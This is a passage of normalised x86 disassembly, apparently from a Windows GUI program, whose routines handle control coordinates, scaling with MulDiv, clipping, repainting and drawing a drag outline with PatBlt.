mov eax ebx
call sub_4371b0
mov ecx esp
mov edx esi
call sub_412ce0
mov edx esp
mov eax ebx
call sub_437638
pop ecx
pop edx
pop esi
pop ebx
retn
sub_437234
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4372b5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4372bc
lea eax [ ebp - 0xc ]
call sub_404050
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
sub_4372c4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4372f0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43731c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_452180
sub_43734c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_438978
sub_4373c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41dc3c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41dc58
sub_437594
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43762a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41ae9c
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_4377ac
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_40445c
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437631
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4377dc
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_437638
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_437680
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
test esi esi
je r-xdata
mov edx ebx
call sub_43abe4
mov edx ebx
mov eax esi
call sub_43ab10
mov eax ebx
call sub_436e00
sub_4376cc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403490
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_438978
mov eax edi
mov si 0xffd0
call sub_403490
sub_437764
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_44b0dc
mov edx ebx
mov eax esi
call sub_41aa14
sub_437788
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_438978
pop ebx
retn
sub_4377ac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_437720
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404140
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_437730
sub_4377dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437831
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4377ac
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40445c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437838
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax esi
call sub_404510
mov edx eax
mov eax ebx
call sub_437788
sub_43785c
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41db98
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_438978
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41db98
mov [ ebx + 0x84 ] eax
sub_4379e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4379d4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43497c
mov eax esi
call sub_43497c
jmp r-xdata
sub_437a1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_4141cc
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_414060
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_4141ec
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_437bf4
mov eax ebx
call sub_44e0d0
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403490
sub_437a9c
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_437a1c
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_437a1c
jmp r-xdata
sub_437ac0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_437b56
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437b5d
lea eax [ ebp - 0xc ]
call sub_404050
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
sub_437b68
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_4141cc
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_414170
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43714c
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437bf4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43e270
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43714c
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43df6c
push eax
call InvalidateRect
push ebp
call sub_437b68
pop ecx
test al al
je r-xdata
mov al 0x1
sub_437c90
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44e0a8
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_438978
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403490
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437cf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43e270
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43df6c
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_437dcd
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43bd78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43df6c
push eax
call ReleaseDC
retn
sub_437e6c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax edi
call sub_4389ac
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4372f0
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a04
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_438978
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_435afc
sub_437f40
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_437f7c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_437fc8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_437ff4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_437750
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43773c
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a84
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a84
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_43df6c
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_4380d8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_438124
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403490
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403490
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4381e8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_438234
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_438280
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43839b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41e1b8
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4383a2
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_4383d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_4372f0
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403444
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403490
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403490
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403490
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403490
jmp r-xdata
sub_4384c4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412ce0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_4389ac
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43773c
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_437750
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_412d30
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
